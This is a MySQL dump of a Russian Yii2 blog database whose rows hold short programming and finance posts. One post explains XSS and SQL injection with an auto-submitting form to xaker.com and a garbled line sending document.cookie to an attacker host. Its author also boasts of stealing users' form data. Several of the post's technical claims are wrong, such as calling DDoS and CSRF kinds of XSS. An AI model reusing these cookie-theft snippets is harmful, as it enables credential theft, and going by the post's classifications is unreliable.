-- --------------------------------------------------------
-- Хост:                         127.0.0.1
-- Версия сервера:               8.0.24 - MySQL Community Server - GPL
-- Операционная система:         Win64
-- HeidiSQL Версия:              11.3.0.6295
-- --------------------------------------------------------

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET NAMES utf8 */;
/*!50503 SET NAMES utf8mb4 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;


-- Дамп структуры базы данных yii2blogs
CREATE DATABASE IF NOT EXISTS `yii2blogs` /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci */ /*!80016 DEFAULT ENCRYPTION='N' */;
USE `yii2blogs`;

-- Дамп структуры для таблица yii2blogs.blog
CREATE TABLE IF NOT EXISTS `blog` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `intro` text COLLATE utf8mb4_general_ci,
  `text` text COLLATE utf8mb4_general_ci,
  `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `update_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `author` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT 'Admin',
  `image` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `like` int DEFAULT '0',
  `look` int DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=24 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- Дамп данных таблицы yii2blogs.blog: ~22 rows (приблизительно)
/*!40000 ALTER TABLE `blog` DISABLE KEYS */;
INSERT INTO `blog` (`id`, `title`, `intro`, `text`, `create_at`, `update_at`, `author`, `image`, `like`, `look`) VALUES
	(1, 'Тест', 'Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, ', '<h1>Текст, текст, текст,</h1>\r\n\r\n<p><strong>Текст, текст, текст, Текст, текст, текст</strong>, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, <span style="color:#FF0000">текст, текст, Текст, текст, текст, Текст, текст, текст, </span>Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст,</p>\r\n\r\n<p><img alt="" src="/yii2blog/files/blog/80d8aa865a481526a960.jpg" style="float:left; height:225px; width:400px" /></p>\r\n\r\n<p>Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст, Текст, текст, текст,</p>\r\n\r\n<div>&nbsp;</div>\r\n', '2022-09-12 17:50:28', '2022-09-13 16:44:03', 'Admin', '1.jpg', 1, 0),
	(2, 'Программирование на Yii', 'Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, ', 'Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, Текст на Yii, ', '2022-09-13 15:04:39', '2022-09-13 15:06:04', '', 'b58646766b5e12da90c4.jpg', 0, 0),
	(4, 'XSS АТАКИ И SQL-ИНЪЕКЦИИ', 'Компьютерные технологии и угрозы в интернете\r\n\r\n…Компьютерные технологии развивались сильнее других технологий. Двадцать первый век стал рассветом для компьютерных технологий и инноваций. От первичных ЭВМ и простейших вычислительных машин люди создали современные компьютеры, размеры некоторых чипов могут сопоставимы быть с молекулярными размерами.\r\n\r\nНаряду с компьютерными технологиями развивался интернет. Интернет изначально был военным проектом в США, что создавался для сообщений между удаленными группами компьютеров. Однако со временем интернет стал частью человеческой культуры. Современные люди не мыслят жизни без связи, без компьютеров, без телефонии, без интернета.', '<p style="text-align:justify"><strong>Компьютерные технологии и угрозы в интернете</strong></p>\r\n\r\n<p style="text-align:justify">&hellip;Компьютерные технологии развивались сильнее других технологий. Двадцать первый век стал рассветом для компьютерных технологий и инноваций. От первичных ЭВМ и простейших вычислительных машин люди создали современные компьютеры, размеры некоторых чипов могут сопоставимы быть с молекулярными размерами.</p>\r\n\r\n<p style="text-align:justify">Наряду с компьютерными технологиями развивался интернет. Интернет изначально был военным проектом в США, что создавался для сообщений между удаленными группами компьютеров. Однако со временем интернет стал частью человеческой культуры. Современные люди не мыслят жизни без связи, без компьютеров, без телефонии, без интернета.</p>\r\n\r\n<p style="text-align:justify">Развитие этих технологий породило новые угрозы. Эти угрозы киберпространства, где вредоносные программы или люди обученные для взломов и хакинга похищали данные, либо проводили разного рода манипуляции для достижении своих целей. Своими действиями хакер мог бы взломать почту, либо заняться созданием фишинговых сайтов, либо кражей информацией, а также взломом закрытых данных, как на сайтах, так и на серверах хранения информации.</p>\r\n\r\n<p style="text-align:justify"><strong>XSS-</strong><strong>атаки и их разновидности</strong></p>\r\n\r\n<p style="text-align:justify">XSS&ndash; это одна из разновидностей угроз в интернете, где в код веб-страницы внедряется некоторый вредоносный скрипт, который запускает пользователь при просмотре страницы, либо при переходе на ссылки сайта с внедренным кодом. Суть XSSатак направлена в первую очередь на пользователя с целью получения данных, либо для рассылки спама, либо для похищения информации, а также для протоколирования действий того человека, что стал жертвой.</p>\r\n\r\n<p style="text-align:justify"><strong>Активные и пассивные&nbsp;</strong><strong>XSS</strong></p>\r\n\r\n<p style="text-align:justify">Различают XSSпассивные и активные. Активные действия атак XSSболее опасные, потому что пользователя не нужно заманивать даже по ссылкам никуда, его не нужно обманывать. В случае активной XSSатаки на сервер внедряется код, в виде SQL-инъекции, либо в заранее подготовленные модификации в работе базы данных, а также программного кода. Потому в этом случае пользователь, даже ничего не делая, страдает от активной формы XSS-атаки.</p>\r\n\r\n<p style="text-align:justify">В случае пассивной XSS-атаки пользователя заманивают на фишинговые сайты, либо заставляют перейти по ссылке, либо выполнить некоторые действия по установке программного обеспечения, после чего злоумышленник получает доступ к данным жертвы, и может наблюдать за действиями таких людей, которые проглотили наживку от хакера.</p>\r\n\r\n<p style="text-align:justify">Кроме того можно назвать оборонительные действия XSS. Это когда хакер устанавливает на своем компьютере ПО или скрытные резидентные программы, для протоколирования действия других программ, а также для анализа сетевого трафика. Кроме того сюда можно включить ПО, которое обманывает другие шпионские программы, путем передачи им скрина-экрана, где ничего не происходит, либо происходит что-то другое. В этот момент хакер может свободно проводить другие действия, на компьютере минуя ловушки шпионского программного обеспечения, а также защищать себя от чужого протоколирования собственных действий.</p>\r\n\r\n<p style="text-align:justify">Пример пассивной уязвимости можно представить простейшим кодом:</p>\r\n\r\n<p style="text-align:justify"><strong>&nbsp;</strong></p>\r\n\r\n<form action="http://xaker.com/1.php" method="post">\r\n<p><strong>&lt; form method=&quot;post&quot; action=&quot;http://xaker.com/1.php&quot;&gt;</strong></p>\r\n\r\n<p><strong>&nbsp;&nbsp; &lt; input type=&quot;hidden&quot; name=&quot;var&quot; value=&quot;&lt; script&gt;alert(&#39;xss&#39;)&lt; /script&gt;&quot;&gt;</strong></p>\r\n\r\n<p><strong>&nbsp;&nbsp;&nbsp; &lt; /form&gt;</strong></p>\r\n\r\n<p><strong>&nbsp;&nbsp;&nbsp; &lt; script type=&quot;text/javascript&quot;&gt;</strong></p>\r\n\r\n<p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementsByTagName(&#39;form&#39;)[0].submit();</strong></p>\r\n<strong>&nbsp;&nbsp;&nbsp; &lt; /script&gt;</strong></form>\r\n\r\n<p style="text-align:justify"><strong>&nbsp;&nbsp;&nbsp;</strong>POSTзапросы более безопасные, чем GET, если говорить об их функциональности. Потому в случае с POSTзапросами, приходится думать о переадресации запросов на другой сервер, или что-то в этом роде. С GETдовольно все просто. В GETвсе параметры передаются в строке. И любой программист, и не только программист, может их прочитать. Это открытая информация, которую можно использовать для дальнейших действий. Хакеру эта инфа также нужна, чтобы выполнить определенные действия. Несмотря на то, что в GET-запросах шифруются данные, все это можно также обмануть. Для хакеров это не является серьезной проблемой.</p>\r\n\r\n<p style="text-align:justify"><strong>Кража конфиденциальных данных</strong></p>\r\n\r\n<p style="text-align:justify"><strong>Кража Cookies</strong>&ndash; является одним из наиболее частых примеров XSS-атак. Напомню всем, что в куках хранятся пароли, логины, хеши, сессии и много чего интересного. Потому украсть такую информацию у пользователя не представляется большим трудом.</p>\r\n\r\n<p style="text-align:justify">К примеру, такой код:</p>\r\n\r\n<p style="text-align:justify">&nbsp;&nbsp;&nbsp;&nbsp;<strong>var info = new Info();</strong></p>\r\n\r\n<p style="text-align:justify">&nbsp;&nbsp;&nbsp;&nbsp;<strong>і</strong><strong>nfo.sr</strong><strong>с</strong><strong>= &#39;http://xaker/xss.php?&#39;&nbsp;</strong><strong>+ document.cookie;</strong></p>\r\n\r\n<p style="text-align:justify">Способен украсть у вас информацию cookie. Имея куки, хакер может узнать ваш логин, пароль, хеш. После чего при желании и должном упорстве можно взломать почту, перейти на личный сайт организации, допустим, и украсть оттуда всю инфу. Возможностей много, все дело в желании, упорстве и настойчивости, а также в вопросе: &laquo;А так ли мне нужна эта инфа от чужого пользователя или определенной организации?&raquo;</p>\r\n\r\n<p style="text-align:justify"><strong>Кража информации из веб-форм</strong></p>\r\n\r\n<p style="text-align:justify">Возможно,1 также украсть данные пользователя через форму. Если, допустим, жертва заходит на сайт и вводит данные в форму, а там, как известно для программистов и хакеров есть событие onsubmit, то по этому событию хакер может свободно украсть информацию о ком-либо. Перед&nbsp; отправкой данные отдаются злоумышленнику, и тот получает в руки всю информацию о том, кто заходил на сайт, а также знает уже логин, пароли. Я лично сам так делал пару раз, и скажу честно, что неприятно было узнавать тайны людей, которым доверял, но которые обманывали самым наглым образом.</p>\r\n\r\n<p style="text-align:justify">Этот способ сопоставим с фишинговым обманом, однако, тут не используется поддельный сайт, а внедряется вредоносный код в форму уже имеющегося сайта. Это делается на стороне клиента чаще всего, реже на стороне сервера, где вдруг неосмотрительный админ или программист спустя какое-то время обнаруживает, что на формах у него стоят ловушки от неизвестного хакера, который собирал информацию с пользователей.</p>\r\n\r\n<p style="text-align:justify"><strong>DDoS-атака (&laquo;отказ в обслуживании&raquo;)</strong></p>\r\n\r\n<p style="text-align:justify">Еще один тип XSS-атаки, который может разрушить работу и функциональность сайта на неопределенное время. Я лично проводил такого рода тесты, и могу сказать, что DDoS-атаки выводят из строя сервера, и те не справляются с нагрузкой, после чего сервер уходит в забытье. В этом есть успех хакеров, которые проводят такого рода атаки. При проектировании сайтов также сталкивался с такого рода атаками со стороны неизвестных злоумышленников, цель которых была вывести работу и помешать процессу программирования, либо застопорить сайт настолько сильно, что это вызвало бы осложнения.</p>\r\n\r\n<p style="text-align:justify">Создавать такие атаки довольно легко, поскольку можно написать программу или вредоносный код, который будет настойчиво и упорно посылать запросы на сайт, снижая работоспособность сайта до нуля. Не обязательно что-то внедрять на сервер или на компьютер жертвы код или скрип, все делается удаленно с &laquo;серых&raquo;, либо белых ip-адресов.</p>\r\n\r\n<p style="text-align:justify">Парсинг сайтов или грабберы сайтов также можно назвать в некоторой мере DDos-атаками, так как они снижают производительность сайта. Если этот сервер не имеет достаточных мощностей, то от действия парсинга или грабберов сайта, сайт может повиснуть.</p>\r\n\r\n<p style="text-align:justify">В свое время я боролся с механизмами защиты сайтов от парсинга и грабберов. Поскольку сайты защищали свои GET-запросы, то мне приходилось обманывать защиту сайта, отчего админы и владельцы сайта не могли понять, как мой программный робот проникал в систему сайта и выдирал, оттуда всю информацию, преодолевая защитные системы сайта.</p>\r\n\r\n<p style="text-align:justify"><strong>Запросы (</strong><strong>CSRF</strong><strong>/</strong><strong>XSRF</strong><strong>) и обманные межсайтовые запросы</strong></p>\r\n\r\n<p style="text-align:justify">Это еще один обман для пользователей, с трудом можно назвать XSS-атаками. Тем не менее суть сводится к гибриду действий между фишинговыми действиями и заманиваниями пользователя на другие сайты. После того, как пользователь перешел на чужой сайт, который может выглядеть идентичным с настоящим сайтом, злоумышленник может хоть что сделать с данными пользователя. Это может быть похищение e-mail, перевод и кража электронных денег, это может быть получение информации, либо копеечное хищение денег с банковских карт клиентов, которые вдруг стали жертвами обманных межсайтовых запросов.</p>\r\n\r\n<p style="text-align:justify"><strong>XSS-черви</strong></p>\r\n\r\n<p style="text-align:justify">Черви, это программы, что переползают грубо говоря с одного компьютера на другой, либо с одного авторизованной страницы социальной сети к другой. Суть червей заключается в том, что они передают скрипт, который передает сообщения другим пользователям, а те в свою очередь также поддерживают жизнь XSS-червей, читая и переходя по ссылкам от червей.</p>\r\n\r\n<p style="text-align:justify"><strong>Счетчики и сборщики информации XSS</strong></p>\r\n\r\n<p style="text-align:justify">На большинстве сайтах устанавливаются счетчики посещаемости, кроме того там можно получить данные о браузере пользователя, об устройстве через который вышел пользователь. Можно знать ip-адрес, шлюз и многое другое. Потому эти сборщики информации также является в некотором роде из семейства XSS-детищ. Безобидными &nbsp;можно считать даже XSS кроссдоменные AJAX-запросы.</p>\r\n\r\n<p style="text-align:justify"><strong>Вместо заключения</strong></p>\r\n\r\n<p style="text-align:justify">Потому можно резюмировать виды XSS-атак по следующим вышеописанным типам. Кроме того я упомяну про SQL-инъекции, которые являются частью активных XSS-атак. SQL-инъекции &ndash; это внедрение запроса в подзапрос SQL, либо замена данных в базе, а также выполнение дополнительных запросов, помимо предусмотренных разработчиками действий. Суть инъекций заключается в том, чтобы выудить информацию с сайта или из программы, не имея при, это доступа к тем данным. Очень уязвимы для инъекций бывают SQL-запросы, где в GET-параметрах пишется зашифрованный запрос к базе, либо передаются параметры базы. В этом случае, если разработчики не позаботились об экранировании данных, а также о том, чтобы защитить себя от XSS-атак, они подвергаются риску быть взломанными, а, следовательно, либо лишиться информации, либо передать секретные данные кому-то еще, кто практикуется на SQL-инъекциях и XSS-атаках.</p>\r\n', '2022-09-14 12:58:52', '2022-09-14 12:58:52', 'Admin', '7c099f98abaf4e8d25c8.jpg', 0, 0),
	(5, 'ПОРЯДОК ВЫПОЛНЕНИЯ В SQL-ЗАПРОСЕ', 'Работая программистом в прикладном программирование, либо в вебе, зачастую приходится оперировать с SQL-запросами, делать обращения к базам данных. Потому хотелось бы немного рассказать о порядке исполнения самого SQL запроса. Я не буду рассказывать базовые вещи о [SELECT]. Описательную часть работы ее можно прочесть в интернете с достатком. Я расскажу о том, как нужно строить SQL запрос, понимая, что он выполняется не сразу, а последовательно.', '<p style="text-align:justify">Работая программистом в прикладном программирование, либо в вебе, зачастую приходится оперировать с SQL-запросами, делать обращения к базам данных. Потому хотелось бы немного рассказать о порядке исполнения самого SQL запроса. Я не буду рассказывать базовые вещи о [SELECT]. Описательную часть работы ее можно прочесть в интернете с достатком. Я расскажу о том, как нужно строить SQL запрос, понимая, что он выполняется не сразу, а последовательно.</p>\r\n\r\n<p style="text-align:justify">Итак исполнение запроса идет в следующем порядке:</p>\r\n\r\n<p style="text-align:center"><br />\r\n<strong><span style="background-color:rgb(255, 255, 0)">1. [FROM]</span></strong></p>\r\n\r\n<p style="text-align:center"><strong><span style="background-color:rgb(255, 255, 0)">2. [WHERE]</span></strong></p>\r\n\r\n<p style="text-align:center"><strong><span style="background-color:rgb(255, 255, 0)">3. [GROUP BY]</span></strong></p>\r\n\r\n<p style="text-align:center"><strong><span style="background-color:rgb(255, 255, 0)">4. [HAVING]</span></strong></p>\r\n\r\n<p style="text-align:center"><strong><span style="background-color:rgb(255, 255, 0)">5. [SELECT]</span></strong></p>\r\n\r\n<p style="text-align:center"><strong><span style="background-color:rgb(255, 255, 0)">6. [ORDER BY]</span></strong></p>\r\n\r\n<p style="text-align:justify">Первое исполнение у нас проходит [FROM], где идет подключение таблиц, а также идет присвоение псевдонимов этим таблицам, если они есть. Вторым пунктом исполнения идут условия в разделе [WHERE]. Тут тоже все понятно, запрос обсекают разными условиями, где идет либо связка нескольких таблиц, либо уменьшение выборки данных. Третьим исполняется группировка табличных данных в разделе [GROUP BY]. Это важно, когда мы используем агрегатные функции. Четвертый раздел исполнения - это [HAVING]. Это также опциональный параметр оператора [SELECT] для указания условия на результат агрегатных функций. Затем пятым исполнение делает сам [SELECT], где все отобранные поля формируются для вывода подают программисту результат работы. После чего все эти данные сортируются в секции [ORDER BY].</p>\r\n\r\n<p style="text-align:justify">Вот собственно все, что я хотел рассказать по этому поводу, как исполняется [SELECT] запрос, не касаясь вопросов учебного типичного материала.</p>\r\n', '2022-09-14 13:01:46', '2022-09-14 13:01:46', 'Admin', '5bad584ea2e2d00bc59b.jpg', 0, 0),
	(6, 'ФОНДОВЫЕ ИНСТРУМЕНТЫ: ЯПОНСКИЕ СВЕЧИ', 'Фондовый рынок - это непрерывно колыхающаяся совокупность значений цены величины, которая торгуется на бирже. Предметом продаж может быть валюта, драгоценные металлы, акции, ценные бумаги, криптовалюта или ваучеры.\r\n\r\nСоответственно, чтобы играть на бирже нужно замечать тенденции в развитие ресурса. Ресурс может дешеветь, либо дорожать. Метод представления в виде колбочковидных полосочек называется вид японских свечей. Черные свечи означают ниспадающие, удешевляющиеся тенденции ресурса.', '<p style="text-align:justify">Фондовый рынок - это непрерывно колыхающаяся совокупность значений цены величины, которая торгуется на бирже. Предметом продаж может быть валюта, драгоценные металлы, акции, ценные бумаги, криптовалюта или ваучеры.</p>\r\n\r\n<p style="text-align:justify">Соответственно, чтобы играть на бирже нужно замечать тенденции в развитие ресурса. Ресурс может дешеветь, либо дорожать. Метод представления в виде колбочковидных полосочек называется вид японских свечей. Черные свечи означают ниспадающие, удешевляющиеся тенденции ресурса.</p>\r\n\r\n<p style="text-align:justify">&nbsp;Белые свечи означают восхождение ресурса в цене. Потому в случае белых свечей цена открытия находится в нижней позиции, а цена закрытия находится в верхней позиции.С черными свечами все наоборот.</p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/333.jpg" style="border:2px solid; box-sizing:border-box; height:272px; vertical-align:middle; width:600px" /></p>\r\n\r\n<p style="text-align:justify">&nbsp;</p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/japan_svecha.png" style="border:2px solid; box-sizing:border-box; height:453px; vertical-align:middle; width:400px" /></p>\r\n\r\n<p style="text-align:justify">Есть ряд методов которые позволяют в долгосрочной перспективе прогнозировать изменения целовых значений ресурса торгующегося на бирже. Метод восходящих кривых, методы усредненных значений и т.д. Именно такие методики позволяют играть в плюсе на бирже, и получать прибыль от колебаний в цене ресурса. Это спекулятивный способ приобретения прибыли, тем не менее, в мире часто практикуют люди, которые работают в сфере экономики и непосредственно на бирже ресурсов. Собственно вот такую лекцию я зачитал вам в письменной форме.</p>\r\n', '2022-09-14 13:06:42', '2022-09-14 13:06:42', 'Admin', 'c58da548cb9a1b004b8e.jpg', 0, 0),
	(7, 'В ЧЕМ ОТЛИЧИЕ МЕЖДУ INCLUDE И REQUIRE [PHP]?', 'Иногда мне задавали такой вопрос. В чем отличие между include и require? На что можно ответить так, что, во-первых, различают следующие конструкции подключения файлов:\r\n\r\n[include] [include_once] [require] [require_once]', '<p style="text-align:justify">Иногда мне задавали такой вопрос. В чем отличие между include и require? На что можно ответить так, что, во-первых, различают следующие конструкции подключения файлов:</p>\r\n\r\n<p style="text-align:justify"><strong><span style="background-color:rgb(255, 255, 0)">[include]</span></strong></p>\r\n\r\n<p style="text-align:justify"><strong><span style="background-color:rgb(255, 255, 0)">[include_once]</span></strong></p>\r\n\r\n<p style="text-align:justify"><strong><span style="background-color:rgb(255, 255, 0)">[require]</span></strong></p>\r\n\r\n<p style="text-align:justify"><strong><span style="background-color:rgb(255, 255, 0)">[require_once]</span></strong></p>\r\n\r\n<p style="text-align:justify">Сразу скажу, что суффикс onceпозволяет подключать файл только единожды, чтобы не загружать внешний файл несколько раз. Теперь об отличиях между include и require. Эти две конструкции ведут себя по-разному, когда подключаемый файл отсутствует. Если файла нет, то&nbsp;<strong><span style="background-color:rgb(255, 255, 0)">include</span></strong>&nbsp;генерирует предупреждение, но работа основного скрипта продолжается,&nbsp;<strong>require</strong>&nbsp;при отсутствии включаемого файла останавливает работу кода.&nbsp;</p>\r\n', '2022-09-14 13:10:10', '2022-09-14 13:10:10', 'Admin', 'c9ce2198185f84c05824.jpg', 0, 0),
	(8, 'КАК РАБОТАТЬ С ОРИГИНАЛЬНЫМ МАССИВОМ [PHP]?', 'И еще один пост на тему программирования на языке PHP: $Arr= Array(‘Значение 1’, ‘Значение 2’, ‘Значение 3’);\r\n\r\nforeach ($Arr as $values)\r\n{\r\n…\r\n}\r\n\r\nОтвет на этот вопрос прост! Так как в данном примере мы работаем с копией массива, потому чтобы работать с оригиналом массива нужно использовать перед value дописать таким образом &$value.', '<p style="text-align:justify">И еще один пост на тему программирования на языке PHP:</p>\r\n\r\n<blockquote>\r\n<p style="text-align:justify"><strong><span style="background-color:rgb(255, 255, 0)">$</span></strong><strong><span style="background-color:rgb(255, 255, 0)">Arr</span></strong><strong><span style="background-color:rgb(255, 255, 0)">=&nbsp;</span></strong><strong><span style="background-color:rgb(255, 255, 0)">Array</span></strong><strong><span style="background-color:rgb(255, 255, 0)">(&lsquo;Значение 1&rsquo;, &lsquo;Значение 2&rsquo;, &lsquo;Значение 3&rsquo;);</span></strong></p>\r\n\r\n<p style="text-align:justify"><strong><span style="background-color:rgb(255, 255, 0)">foreach ($Arr as $values)</span></strong></p>\r\n\r\n<p style="text-align:justify"><strong><span style="background-color:rgb(255, 255, 0)">{</span></strong></p>\r\n\r\n<p style="text-align:justify"><strong><span style="background-color:rgb(255, 255, 0)">&hellip;</span></strong></p>\r\n\r\n<p style="text-align:justify"><strong><span style="background-color:rgb(255, 255, 0)">}</span></strong></p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify">Ответ на этот вопрос прост! Так как в данном примере мы работаем с копией массива, потому чтобы работать с оригиналом массива нужно использовать перед value дописать таким образом&nbsp;<em><span style="background-color:rgb(255, 255, 0)">&amp;$value.</span></em></p>\r\n', '2022-09-14 13:13:02', '2022-09-19 14:31:44', 'Admin', '206dde258c3451ee75ce.jpg', 0, 1),
	(9, 'СПРАЙТ-КОМПЬЮТЕРНЫЕ ИГРЫ', 'Несмотря на развитие 3d  моделирования в компьютерных играх иногда использую канву и спрайтирование для создания игр. Если изьясняться простыми словами: канва - это векторная начертательная графика для рисования элементов, а также объектов игры. Спрайт - это анимационная картинка, которая моделируется в зависимости от процесса игры. Иногда такое используют, чтобы показывать движение объекта.', '<p style="text-align:justify">Несмотря на развитие 3d&nbsp; моделирования в компьютерных играх иногда использую канву и спрайтирование для создания игр. Если изьясняться простыми словами: канва - это векторная начертательная графика для рисования элементов, а также объектов игры. Спрайт - это анимационная картинка, которая моделируется в зависимости от процесса игры. Иногда такое используют, чтобы показывать движение объекта.</p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/player.png" style="border:2px solid; box-sizing:border-box; height:300px; vertical-align:middle; width:400px" /></p>\r\n\r\n<p style="text-align:justify">Если канва рисует контуры и грани чего-либо, то спрайт - представляет собой кадрированные действия, которые в итоге получают анимацию. Такой подход использовался в игрушках начала 2000-х годов. Сейчас такой подход также приемлим. В браузерных играх нецелесообразно иногда использовать векторные движки, потому используют спрайтирование и канву. В языках программирования, например, в Delphi используется GDI Канва, либо GDI+. Кроме того есть множество других методик отрисовки канвы. В JS также используется понятие канва, где средствами ООП проектируется векторно-начертательная графика.</p>\r\n', '2022-09-14 13:16:41', '2022-09-14 13:16:41', 'Admin', 'cd102b9e01998d0bcc25.jpg', 0, 0),
